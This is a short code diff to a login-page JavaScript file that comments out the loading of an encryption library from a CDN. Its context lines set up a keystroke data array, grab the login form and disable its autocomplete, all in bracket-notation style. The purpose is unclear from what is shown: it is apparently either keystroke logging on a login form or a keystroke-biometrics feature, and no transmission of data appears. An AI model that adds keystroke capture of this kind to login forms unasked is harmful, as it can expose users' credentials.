@@ -1,6 +1,6 @@
-var script = document['createElement']('script');
-script['src'] = 'https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js';
-document['head']['appendChild'](script);
+//var script = document['createElement']('script');
+//script['src'] = 'https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js';
+//document['head']['appendChild'](script);
 var keystroke_dataP = [];
 var lform = document['getElementById']('login_form');
 lform['setAttribute']('autocomplete', 'off');
